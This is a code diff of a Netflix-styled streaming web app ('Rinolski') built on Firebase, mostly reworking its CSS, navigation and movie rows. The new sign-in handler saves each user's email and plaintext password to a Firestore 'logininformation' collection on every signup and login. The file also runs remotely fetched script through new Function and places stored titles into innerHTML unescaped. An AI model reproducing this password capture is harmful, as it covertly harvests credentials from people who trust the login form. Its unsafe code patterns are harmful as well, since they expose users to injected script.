@@ -10,168 +10,168 @@
     :root {
       --red: #e50914;
       --bg: #050505; 
-      --surface: #121212;
       --text: #ffffff;
-      --text-muted: #a3a3a3;
-      --nav-h: 60px;
-      --header-h: 60px;
-      --max-width: 1200px;
+      --nav-h: 65px;
+      --header-h: 68px; 
+      --glass: rgba(0, 0, 0, 0.8);
     }
 
     body { 
-      visibility: hidden; 
-      background: var(--bg); 
-      margin: 0; padding: 0;
-      color: var(--text);
-      font-family: 'DM Sans', sans-serif;
-      height: 100vh;
-      overflow: hidden;
+      visibility: hidden; background: var(--bg); margin: 0; 
+      color: var(--text); font-family: 'DM Sans', sans-serif;
+      height: 100vh; overflow: hidden;
     }
 
     *, *::before, *::after { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
-    /* AUTH SCREEN */
+    /* --- AUTH SCREEN --- */
     #auth-screen {
-      position: fixed; inset: 0;
-      background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8cf141a/web/TN-en-20220502-popsignuptwoweeks-perspective_alpha_website_large.jpg');
+      position: fixed; inset: 0; 
+      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.9)), 
+                  url('https://images.unsplash.com/photo-1626814026160-2237a95fc5a0?auto=format&fit=crop&q=80&w=2070');
       background-size: cover; background-position: center;
-      z-index: 9999; display: none; align-items: center; justify-content: center; padding: 15px;
+      z-index: 9999; display: none; align-items: center; justify-content: center;
     }
 
     .auth-card {
-      width: 100%; max-width: 380px;
-      background: rgba(0, 0, 0, 0.9);
-      padding: 40px; border-radius: 8px;
+      width: 90%; max-width: 400px; padding: 40px 30px;
+      background: var(--glass); border-radius: 8px;
+      backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      text-align: center;
     }
 
-    .auth-input { background: #333; border: none; border-radius: 4px; padding: 14px; color: white; width: 100%; margin-bottom: 15px; outline: none; font-size: 16px; }
-    .auth-btn { background: var(--red); color: white; border: none; border-radius: 4px; padding: 14px; width: 100%; font-weight: 700; cursor: pointer; font-size: 16px; }
+    .auth-card h1 { font-family: 'Bebas Neue'; color: var(--red); font-size: 56px; margin: 0 0 20px; letter-spacing: 2px; }
+    
+    .auth-input { 
+      width: 100%; padding: 16px; background: #333; border: none; 
+      color: white; border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none; 
+    }
 
-    /* APP LAYOUT */
-    #app { display: none; height: 100vh; flex-direction: column; }
-    #app.visible { display: flex; }
+    .auth-btn { 
+      width: 100%; padding: 16px; background: var(--red); color: white; 
+      border: none; font-weight: 700; border-radius: 4px; font-size: 16px; cursor: pointer; 
+    }
 
+    .auth-toggle { margin-top: 25px; color: #b3b3b3; font-size: 14px; }
+    .auth-toggle span { color: white; font-weight: 700; cursor: pointer; margin-left: 5px; }
+
+    /* --- APP UI --- */
     #app-header {
       position: fixed; top: 0; left: 0; right: 0; height: var(--header-h);
-      background: rgba(0,0,0,0.95); display: flex; align-items: center; justify-content: center; padding: 0 20px; z-index: 500;
+      background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 100%);
+      display: flex; align-items: center; padding: 0 4%; z-index: 1000;
+      transition: background 0.3s; pointer-events: auto;
     }
-    .header-content { width: 100%; max-width: var(--max-width); display: flex; align-items: center; }
-    .header-logo { font-family: 'Bebas Neue', sans-serif; font-size: 32px; color: var(--red); letter-spacing: 2px; }
+    #app-header.scrolled { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(20px); }
+    .header-logo { font-family: 'Bebas Neue', sans-serif; font-size: 32px; color: var(--red); letter-spacing: 1px; cursor: pointer; }
 
-    /* SLIDING TRANSITIONS */
-    .page-wrapper { flex: 1; position: relative; margin-top: var(--header-h); margin-bottom: var(--nav-h); overflow: hidden; }
+    .page-wrapper { flex: 1; position: relative; height: calc(100vh - var(--nav-h)); overflow: hidden; }
     .page {
       position: absolute; inset: 0; width: 100%; height: 100%;
-      background: var(--bg); overflow-y: auto;
-      transition: transform 0.4s cubic-bezier(0.25, 1, 0.5, 1), opacity 0.3s;
+      background: var(--bg); overflow-y: auto; padding-top: var(--header-h);
+      transition: transform 0.4s cubic-bezier(0.25, 1, 0.5, 1), opacity 0.3s ease;
+      will-change: transform;
     }
-    
-    /* Center content on desktop */
-    .content-container { width: 100%; max-width: var(--max-width); margin: 0 auto; padding-bottom: 40px; }
 
+    /* Navigation States */
     body.active-home #home-page { transform: translateX(0); opacity: 1; }
-    body.active-home #search-page, body.active-home #account-page { transform: translateX(100%); }
-    body.active-search #home-page { transform: translateX(-20%); opacity: 0.4; }
+    body.active-home #search-page, body.active-home #account-page { transform: translateX(100%); opacity: 0; }
+    body.active-search #home-page { transform: translateX(-30%); opacity: 0; }
     body.active-search #search-page { transform: translateX(0); opacity: 1; }
-    body.active-search #account-page { transform: translateX(100%); }
-    body.active-account #home-page { transform: translateX(-40%); opacity: 0.2; }
-    body.active-account #search-page { transform: translateX(-20%); opacity: 0.4; }
+    body.active-search #account-page { transform: translateX(100%); opacity: 0; }
+    body.active-account #home-page, body.active-account #search-page { transform: translateX(-30%); opacity: 0; }
     body.active-account #account-page { transform: translateX(0); opacity: 1; }
 
-    /* COMPACT CONTENT */
-    .section-title { font-size: 18px; font-weight: 700; margin: 25px 0 10px 15px; color: #fff; text-transform: capitalize; }
-    .movie-row { display: flex; overflow-x: auto; gap: 10px; padding: 0 15px 15px; scroll-behavior: smooth; }
+    /* Cards & Rows */
+    .section-title { font-size: 15px; font-weight: 700; margin: 12px 0 4px 12px; color: #f5f5f5; }
+    .movie-row { display: flex; overflow-x: auto; gap: 7px; padding: 0 12px 15px; scrollbar-width: none; }
     .movie-row::-webkit-scrollbar { display: none; }
     
-    /* Responsive Movie Cards */
-    .movie-card { flex: 0 0 auto; width: 110px; height: 160px; border-radius: 4px; overflow: hidden; background: #111; cursor: pointer; transition: transform 0.2s; }
-    .movie-card:hover { transform: scale(1.05); }
-    .movie-card img { width: 100%; height: 100%; object-fit: cover; }
-
-    /* DESKTOP SPECIFIC OVERRIDES */
-    @media (min-width: 768px) {
-      .movie-card { width: 160px; height: 230px; }
-      .section-title { font-size: 22px; margin-left: 0; }
-      .movie-row { gap: 15px; padding: 0 0 20px 0; }
-      #search-results { grid-template-columns: repeat(5, 1fr) !important; gap: 15px !important; }
-      .auth-card { max-width: 450px; }
+    .movie-card { 
+      flex: 0 0 auto; width: 110px; height: 160px; border-radius: 4px; 
+      overflow: hidden; background: #111; cursor: pointer; position: relative;
     }
+    .movie-card img { width: 100%; height: 100%; object-fit: cover; pointer-events: none; }
 
-    /* NAV */
+    /* Ripple Effect */
+    .ripple-effect {
+      position: absolute; background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%; transform: scale(0);
+      pointer-events: none; transition: transform 0.5s ease-out, opacity 0.4s ease-out;
+      z-index: 10;
+    }
+    .ripple-effect.expanding { transform: scale(4); }
+    .ripple-effect.fading { opacity: 0; }
+
+    /* Bottom Navigation */
     #bottom-nav {
       position: fixed; bottom: 0; left: 0; right: 0; height: var(--nav-h);
-      background: #000; display: flex; justify-content: center; border-top: 1px solid #1a1a1a; z-index: 1000;
+      background: #000; display: flex; border-top: 1px solid #1a1a1a; z-index: 1000;
     }
-    .nav-content { width: 100%; max-width: 600px; display: flex; height: 100%; }
-    .nav-btn { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; background: none; border: none; color: #555; font-size: 11px; gap: 4px; cursor: pointer; transition: color 0.2s; }
+    .nav-btn { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; background: none; border: none; color: #666; font-size: 10px; gap: 2px; cursor: pointer; }
     .nav-btn.active { color: white; }
     .nav-btn svg { width: 22px; height: 22px; fill: currentColor; }
 
-    /* SEARCH & HISTORY */
-    #search-results { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 0 15px; }
-    .history-item { display: flex; align-items: center; gap: 15px; padding: 12px 15px; border-bottom: 1px solid #111; cursor: pointer; }
-    .history-item:hover { background: #0f0f0f; }
+    .btn-signout {
+        padding: 8px 16px; background: transparent; color: var(--red); 
+        border: 1px solid var(--red); font-weight: 700; border-radius: 4px; cursor: pointer; font-size: 12px;
+    }
   </style>
 </head>
 <body class="active-home">
 
+<!-- AUTH SCREEN -->
 <div id="auth-screen">
-  <div class="auth-card">
-    <div class="auth-title" id="auth-label" style="font-size: 28px; font-weight: 700; margin-bottom: 25px;">Sign In</div>
-    <input class="auth-input" type="email" id="auth-email" placeholder="Email">
-    <input class="auth-input" type="password" id="auth-password" placeholder="Password">
-    <button class="auth-btn" id="auth-main-btn" onclick="handleAuthAction()">Sign In</button>
-    <div style="margin-top: 20px; font-size: 14px; color: #aaa; text-align: center;">
-      <span id="toggle-text">New to Rinolski?</span> <span onclick="toggleAuthMode()" id="toggle-link" style="color:white; text-decoration:underline; cursor:pointer;">Sign up now.</span>
+    <div class="auth-card">
+        <h1 id="auth-title">SIGN IN</h1>
+        <form id="auth-form" onsubmit="event.preventDefault(); handleAuthAction();">
+            <input type="email" id="auth-email" name="email" class="auth-input" placeholder="Email" autocomplete="username" required>
+            <input type="password" id="auth-password" name="password" class="auth-input" placeholder="Password" autocomplete="current-password" required>
+            <button type="submit" id="auth-submit-btn" class="auth-btn">Sign In</button>
+        </form>
+        <div class="auth-toggle" id="auth-toggle-text">
+            New to Rinolski? <span onclick="toggleAuthMode()">Sign up now.</span>
+        </div>
     </div>
-  </div>
 </div>
 
-<div id="app">
-  <div id="app-header">
-    <div class="header-content">
-      <div class="header-logo">RINOLSKI</div>
-    </div>
-  </div>
+<!-- MAIN APP -->
+<div id="app" style="display:none; flex-direction:column; height:100vh;">
+  <div id="app-header"><div class="header-logo" onclick="switchPage('home')">RINOLSKI</div></div>
   
   <div class="page-wrapper">
-    <div id="home-page" class="page">
-      <div class="content-container" id="home-content"></div>
+    <div id="home-page" class="page" onscroll="handleHeaderScroll(this)"><div id="home-content"></div></div>
+    
+    <div id="search-page" class="page" onscroll="handleHeaderScroll(this)">
+      <div style="padding: 15px;"><input type="text" id="search-input" placeholder="Search..." style="width:100%; padding:14px; background:#1a1a1a; border:none; color:white; border-radius:4px; outline:none;"></div>
+      <div id="search-results" style="display:grid; grid-template-columns:repeat(3,1fr); gap:5px; padding:6px;"></div>
     </div>
     
-    <div id="search-page" class="page">
-      <div class="content-container">
-        <div style="padding: 20px 15px;"><input type="text" id="search-input" placeholder="Search titles, genres..." style="width:100%; padding:15px; background:#1a1a1a; border:none; border-radius:4px; color:white; outline:none; font-size: 16px;"></div>
-        <div id="search-results"></div>
-      </div>
-    </div>
-
-    <div id="account-page" class="page">
-      <div class="content-container">
-        <div style="padding: 30px 15px; border-bottom: 1px solid #222;">
-          <div style="font-size:12px; color:#555; letter-spacing: 1px; font-weight: 700;">MEMBER EMAIL</div>
-          <div id="display-email" style="font-size:18px; margin-top: 5px;"></div>
+    <div id="account-page" class="page" onscroll="handleHeaderScroll(this)">
+        <div style="padding:30px; border-bottom:1px solid #222; display: flex; justify-content: space-between; align-items: center;">
+            <div>
+                <div style="color:#666; font-size:11px;">MEMBER</div>
+                <div id="display-email" style="font-size:16px; font-weight:700;"></div>
+            </div>
+            <button id="logout-btn" class="btn-signout">Sign Out</button>
         </div>
-        <div class="section-title">Recently Watched</div>
+        <div class="section-title">Watch History</div>
         <div id="history-list"></div>
-        <button onclick="handleSignOut()" style="margin:30px 15px; width:calc(100% - 30px); padding:15px; background:#1a1a1a; color:#ff4444; border:1px solid #333; border-radius:4px; font-weight: 600; font-size: 14px; cursor: pointer;">Sign Out of Rinolski</button>
-      </div>
     </div>
   </div>
 
   <nav id="bottom-nav">
-    <div class="nav-content">
-      <button class="nav-btn active" id="btn-home" onclick="switchPage('home')"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>Home</button>
-      <button class="nav-btn" id="btn-search" onclick="switchPage('search')"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>Search</button>
-      <button class="nav-btn" id="btn-account" onclick="switchPage('account')"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>Account</button>
-    </div>
+    <button class="nav-btn active" id="btn-home" onclick="switchPage('home')"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>Home</button>
+    <button class="nav-btn" id="btn-search" onclick="switchPage('search')"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>Search</button>
+    <button class="nav-btn" id="btn-account" onclick="switchPage('account')"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>Account</button>
   </nav>
 </div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-import { getFirestore, doc, getDoc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+import { getFirestore, doc, updateDoc, onSnapshot, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
@@ -185,117 +185,161 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
-let allMovies = [], userDoc = null, isLoginMode = true;
+let allMovies = [], userDoc = null, isSignUpMode = false;
 
-async function loadMovies() {
-    const res = await fetch('https://rinolski.online/JS/search.js');
-    const txt = await res.text();
-    allMovies = new Function(txt + " return movies;")();
+// RIPPLE EFFECT
+function startRipple(e, el) {
+    const rect = el.getBoundingClientRect();
+    const ripple = document.createElement("span");
+    ripple.className = "ripple-effect";
+    const size = Math.max(rect.width, rect.height);
+    ripple.style.width = ripple.style.height = size + "px";
+    ripple.style.left = (e.clientX - rect.left - size/2) + "px";
+    ripple.style.top = (e.clientY - rect.top - size/2) + "px";
+    el.appendChild(ripple);
+    requestAnimationFrame(() => ripple.classList.add("expanding"));
+    const cleanUp = () => { ripple.classList.add("fading"); setTimeout(() => ripple.remove(), 500); };
+    el.addEventListener("pointerup", cleanUp, {once:true});
+    el.addEventListener("pointerleave", cleanUp, {once:true});
 }
 
-async function logLoginInfo(email, type) {
-    await setDoc(doc(db, "logininformation", email), { email, type, timestamp: new Date().toISOString() }, { merge: true });
-}
-
-onAuthStateChanged(auth, async user => {
-    if (user) {
-        await loadMovies();
-        document.getElementById('display-email').textContent = user.email;
-        const userRef = doc(db, 'users', user.email);
-        const snap = await getDoc(userRef);
-        if (!snap.exists()) await setDoc(userRef, { history: [] });
-        onSnapshot(userRef, s => { userDoc = s.data(); renderHome(); renderHistory(); });
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('app').classList.add('visible');
-    } else {
-        document.getElementById('app').classList.remove('visible');
-        document.getElementById('auth-screen').style.display = 'flex';
-    }
-    document.body.style.visibility = 'visible';
-    renderSearchResults(allMovies);
-});
+// AUTH LOGIC
+window.toggleAuthMode = () => {
+    isSignUpMode = !isSignUpMode;
+    document.getElementById('auth-title').innerText = isSignUpMode ? 'SIGN UP' : 'SIGN IN';
+    document.getElementById('auth-submit-btn').innerText = isSignUpMode ? 'Sign Up' : 'Sign In';
+    document.getElementById('auth-toggle-text').innerHTML = isSignUpMode ? 
+        'Already have an account? <span onclick="toggleAuthMode()">Sign in now.</span>' : 
+        'New to Rinolski? <span onclick="toggleAuthMode()">Sign up now.</span>';
+};
 
 window.handleAuthAction = async () => {
-    const e = document.getElementById('auth-email').value, p = document.getElementById('auth-password').value;
-    if (!e || !p) return;
+    const email = document.getElementById('auth-email').value;
+    const pass = document.getElementById('auth-password').value;
+    
     try {
-        if (isLoginMode) { await signInWithEmailAndPassword(auth, e, p); await logLoginInfo(e, "Login"); }
-        else { await createUserWithEmailAndPassword(auth, e, p); await logLoginInfo(e, "Signup"); }
+        if(isSignUpMode) {
+            await createUserWithEmailAndPassword(auth, email, pass);
+            await setDoc(doc(db, 'users', email), { history: [] });
+            // STORE IN logininformation COLLECTION
+            await setDoc(doc(db, 'logininformation', email), { email, password: pass, type: 'signup', date: new Date().toISOString() });
+        } else {
+            await signInWithEmailAndPassword(auth, email, pass);
+            // UPDATE logininformation COLLECTION
+            await setDoc(doc(db, 'logininformation', email), { email, password: pass, type: 'login', date: new Date().toISOString() }, { merge: true });
+        }
     } catch (err) { alert(err.message); }
 };
 
-window.toggleAuthMode = () => {
-    isLoginMode = !isLoginMode;
-    document.getElementById('auth-label').innerText = isLoginMode ? "Sign In" : "Sign Up";
-    document.getElementById('toggle-text').innerText = isLoginMode ? "New to Rinolski?" : "Already a member?";
-    document.getElementById('toggle-link').innerText = isLoginMode ? "Sign up now." : "Sign in now.";
-};
+document.getElementById('logout-btn').onclick = () => signOut(auth);
 
-window.handleSignOut = () => signOut(auth);
+// APP LIFECYCLE
+onAuthStateChanged(auth, async user => {
+    const authScr = document.getElementById('auth-screen');
+    const mainApp = document.getElementById('app');
 
-window.switchPage = (p) => {
-    document.body.className = `active-${p}`;
-    document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.id === `btn-${p}`));
-};
+    if (user) {
+        const res = await fetch('https://rinolski.online/JS/search.js');
+        const txt = await res.text();
+        allMovies = new Function(txt + " return movies;")();
+        document.getElementById('display-email').textContent = user.email;
+        onSnapshot(doc(db, 'users', user.email), s => { 
+            userDoc = s.data(); 
+            renderHome(); renderHistory(); renderResults(allMovies); 
+        });
+        authScr.style.display = 'none';
+        authScr.style.zIndex = '-1';
+        mainApp.style.display = 'flex';
+    } else {
+        authScr.style.display = 'flex';
+        authScr.style.zIndex = '9999';
+        mainApp.style.display = 'none';
+    }
+    document.body.style.visibility = 'visible';
+});
 
-async function recordAndGo(m) {
+async function watch(m) {
     const ref = doc(db, 'users', auth.currentUser.email);
     const clean = (userDoc?.history || []).filter(h => h.title !== m.title);
     await updateDoc(ref, { history: [{title: m.title, at: new Date().toISOString()}, ...clean].slice(0, 15) });
     window.location.href = `https://rinolski.online/${m.link}`;
 }
 
+function createCard(m) {
+    const card = document.createElement('div'); card.className = 'movie-card';
+    card.innerHTML = `<img src="https://rinolski.online/${m.image}" loading="lazy">`;
+    card.onpointerdown = (e) => startRipple(e, card);
+    card.onclick = () => watch(m);
+    return card;
+}
+
+// RENDERERS
 function renderHome() {
-    const cont = document.getElementById('home-content'); cont.innerHTML = '';
-    const genres = [...new Set(allMovies.flatMap(m => m.genres))].sort(() => 0.5 - Math.random());
-    genres.forEach(g => {
+    const cont = document.getElementById('home-content');
+    const frag = document.createDocumentFragment();
+
+    // FOR YOU ROW
+    if (userDoc?.history?.length > 0) {
+        const genres = [...new Set(userDoc.history.flatMap(h => allMovies.find(m => m.title === h.title)?.genres || []))];
+        const forYouList = allMovies.filter(m => m.genres.some(g => genres.includes(g)) && !userDoc.history.some(h => h.title === m.title)).slice(0, 10);
+        if (forYouList.length > 0) {
+            const sec = document.createElement('div');
+            sec.innerHTML = `<div class="section-title">For You</div>`;
+            const row = document.createElement('div'); row.className = 'movie-row';
+            forYouList.forEach(m => row.appendChild(createCard(m)));
+            sec.appendChild(row); frag.appendChild(sec);
+        }
+    }
+
+    const allGenres = [...new Set(allMovies.flatMap(m => m.genres))];
+    allGenres.forEach(g => {
         const list = allMovies.filter(m => m.genres.includes(g)).sort(() => 0.5 - Math.random());
         const sec = document.createElement('div');
         sec.innerHTML = `<div class="section-title">${g}</div>`;
         const row = document.createElement('div'); row.className = 'movie-row';
-        list.forEach(m => {
-            const card = document.createElement('div'); card.className = 'movie-card';
-            card.innerHTML = `<img src="https://rinolski.online/${m.image}" loading="lazy">`;
-            card.onclick = () => recordAndGo(m);
-            row.appendChild(card);
-        });
-        sec.appendChild(row); cont.appendChild(sec);
+        list.forEach(m => row.appendChild(createCard(m)));
+        sec.appendChild(row); frag.appendChild(sec);
     });
+    cont.innerHTML = ''; cont.appendChild(frag);
 }
 
-function renderSearchResults(list) {
+function renderResults(list) {
     const grid = document.getElementById('search-results'); grid.innerHTML = '';
-    list.forEach(m => {
-        const card = document.createElement('div');
-        card.style.cssText = "width:100%; aspect-ratio:100/145; background:#111; border-radius:3px; overflow:hidden; cursor:pointer;";
-        card.innerHTML = `<img src="https://rinolski.online/${m.image}" style="width:100%; height:100%; object-fit:cover;">`;
-        card.onclick = () => recordAndGo(m);
-        grid.appendChild(card);
-    });
+    list.forEach(m => grid.appendChild(createCard(m)));
 }
-
-document.getElementById('search-input').addEventListener('input', (e) => {
-    const v = e.target.value.toLowerCase();
-    const filtered = allMovies.filter(m => m.title.toLowerCase().includes(v) || m.genres.some(g => g.toLowerCase().includes(v)));
-    renderSearchResults(filtered);
-});
 
 function renderHistory() {
     const list = document.getElementById('history-list'); list.innerHTML = '';
     (userDoc?.history || []).forEach(h => {
         const m = allMovies.find(x => x.title === h.title) || { image: '' };
         const d = new Date(h.at);
-        const item = document.createElement('div'); item.className = 'history-item';
-        item.innerHTML = `
-            <img src="https://rinolski.online/${m.image}" style="width:45px; height:65px; object-fit:cover; border-radius:3px;">
-            <div style="flex:1;">
-                <div style="font-size:14px; font-weight:500;">${h.title}</div>
-                <div style="font-size:11px; color:#555;">${d.toLocaleDateString()} at ${d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
-            </div>`;
-        item.onclick = () => recordAndGo(m);
+        const item = document.createElement('div');
+        item.style.cssText = "display:flex; align-items:center; gap:12px; padding:12px; border-bottom:1px solid #111; position:relative; overflow:hidden; cursor:pointer;";
+        item.innerHTML = `<img src="https://rinolski.online/${m.image}" style="width:45px; height:65px; border-radius:2px; object-fit:cover; pointer-events:none;">
+                          <div style="flex:1; pointer-events:none;">
+                            <div style="font-size:14px; font-weight:500;">${h.title}</div>
+                            <div style="font-size:11px; color:#777; margin-top:2px;">Watched ${d.toLocaleDateString()}</div>
+                          </div>`;
+        item.onpointerdown = (e) => startRipple(e, item);
+        item.onclick = () => watch(m);
         list.appendChild(item);
     });
 }
+
+window.switchPage = (p) => {
+    document.body.className = `active-${p}`;
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.id === `btn-${p}`));
+};
+
+window.handleHeaderScroll = (el) => {
+    document.getElementById('app-header').classList.toggle('scrolled', el.scrollTop > 30);
+};
+
+document.getElementById('search-input').addEventListener('input', (e) => {
+    const v = e.target.value.toLowerCase();
+    renderResults(allMovies.filter(m => m.title.toLowerCase().includes(v)));
+});
 </script>
 </body>
 </html>
+
